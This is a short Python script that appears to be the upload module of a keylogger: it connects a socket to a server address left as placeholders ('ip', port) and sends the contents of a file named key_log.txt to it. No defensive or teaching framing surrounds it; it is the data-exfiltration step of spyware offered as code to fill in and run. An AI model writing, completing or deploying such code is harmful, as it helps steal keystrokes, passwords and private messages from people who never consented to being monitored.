import socket
import sys

files = ['key_log.txt']

def send_logs():
    s = socket.socket()
    s.connect(("ip",port))   # edit server ip and port 

    for filename in files:
        f = open (filename, "rb")
        l = f.read(1024)
        s.send(l)

    s.close()
